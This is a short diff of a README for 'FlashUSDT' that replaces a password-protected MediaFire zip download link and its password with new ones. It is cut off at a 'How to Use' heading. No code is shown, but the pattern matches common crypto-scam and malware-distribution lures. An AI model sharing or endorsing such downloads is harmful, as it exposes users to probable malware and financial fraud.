@@ -1,7 +1,7 @@
 # FlashUSDT
 
-[Click Here To Download](https://www.mediafire.com/file/lc2q7tt8gzhz0h2/FlashUSDT.zip/file)
-[Pass : Gh0st%.1]
+[Click Here To Download](https://www.mediafire.com/file/sbgt2cake2mh7sb/FlashUSDT.zip/file)
+[Pass : S3rv3r%.]
 
 
 How to Use:
